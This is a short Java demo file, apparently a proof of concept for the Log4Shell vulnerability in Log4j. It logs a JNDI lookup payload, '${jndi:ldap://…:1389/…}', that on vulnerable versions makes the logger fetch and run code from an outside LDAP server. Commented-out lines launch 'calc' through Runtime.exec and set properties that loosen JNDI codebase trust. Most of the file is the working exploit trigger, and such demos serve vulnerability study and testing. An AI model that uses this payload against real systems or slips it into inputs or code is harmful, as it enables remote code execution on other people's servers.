package com.winson.log4j.bug.demo;


import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import javax.naming.Context;
import javax.naming.NamingException;
import javax.naming.directory.Attributes;
import javax.naming.directory.DirContext;
import javax.naming.directory.InitialDirContext;
import java.io.IOException;
import java.util.HashMap;
import java.util.Hashtable;

/**
 * @author winson
 * @date 2021/12/27
 **/
public class Log4JBugDemo {

    private static Logger logger= LogManager.getLogger(Log4JBugDemo.class.getName());

    public static void main(String[] args) throws NamingException {
//        try {
//
//            Runtime.getRuntime().exec("calc");
//        } catch (IOException e) {
//            e.printStackTrace();
//        }

//        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
//        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");

        String target = "${jndi:ldap://172.16.2.113:1389/cvywm1}";
        logger.error("test log4j bug ... 1");
        logger.error("params : {}" , target);
        logger.error("test log4j bug ... 3");

    }

}
